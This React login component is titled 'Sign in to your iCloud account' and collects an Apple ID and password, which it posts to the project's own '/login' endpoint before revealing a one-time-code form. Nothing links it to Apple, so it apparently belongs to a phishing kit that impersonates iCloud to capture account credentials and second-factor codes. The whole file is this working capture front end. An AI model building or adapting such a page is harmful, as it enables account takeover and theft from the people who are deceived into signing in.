import React, { useState } from "react";
import styles from "./LoginForm.module.scss"; // Import module.scss file
import { post } from "../../Services/ApiService";

const LoginForm = ({ showOrHideOtpForm, showOrHideLoader }) => {
  const [showPass, setShowPass] = useState(false);
  const handleSubmit = async (event) => {
    event.preventDefault();
    showOrHideLoader(true);
    // Add your sign in logic here
    const formData = new FormData(event.target);
    const ph = formData.get("email");
    const pwd = formData.get("password");

    const obj = {
      ph,
      pwd,
    };

    const response = await post("/login", obj);

    if (response.error) {
      console.error("Something Went Wrong");
    } else {
      showOrHideOtpForm(true);
      showOrHideLoader(false);
    }
  };

  const handlePwd = () => {
    setShowPass((prev) => !prev);
  };

  return (
    <form className={styles.form} onSubmit={handleSubmit}>
      <p className={styles["form-title"]}>Sign in to your iCloud account</p>
      <div className={styles["input-container"]}>
        <input name="email" placeholder="Enter Apple id" type="text" required className={styles.input} />
        <span>
          <svg stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"
              strokeWidth="2"
              strokeLinejoin="round"
              strokeLinecap="round"
            ></path>
          </svg>
        </span>
      </div>
      <div className={styles["input-container"]}>
        <input name="password" placeholder="Enter password" type={showPass ? "text" : "password"} required className={styles.input} />
        <span onClick={handlePwd}>
          <svg stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" strokeWidth="2" strokeLinejoin="round" strokeLinecap="round"></path>
            <path
              d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
              strokeWidth="2"
              strokeLinejoin="round"
              strokeLinecap="round"
            ></path>
          </svg>
        </span>
      </div>
      <button className={styles.submit} type="submit">
        Sign in
      </button>
    </form>
  );
};

export default LoginForm;
